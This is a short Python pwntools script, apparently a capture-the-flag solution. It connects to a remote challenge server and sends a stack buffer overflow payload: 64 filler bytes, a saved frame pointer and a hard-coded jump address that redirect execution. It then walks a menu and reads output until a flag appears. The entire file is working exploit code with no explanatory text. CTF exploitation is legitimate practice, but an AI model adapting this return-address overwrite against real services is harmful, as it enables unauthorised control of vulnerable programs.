import os
from subprocess import Popen, PIPE
import subprocess
from binascii import hexlify, unhexlify
from pwn import *
import struct

saved_ebp   = "b0e1ffffff7f0000"
jump_adress = "db0f400000000000"

#p = process('./bin/step2')
p = remote( "dumbistan.life", 50020)

print p.recv()

p.sendline('1')

sending = 64 * '\xff' + unhexlify(saved_ebp) + unhexlify(jump_adress)

p.sendline(sending)
p.sendline("password")

print p.recv()

p.sendline('2')

p.sendline('9')

while True:
    try:
        recv = p.recv()
        print recv
        if ('flag{' in recv):
            break
    except EOFError:
        print "----> Connection closed"
        break
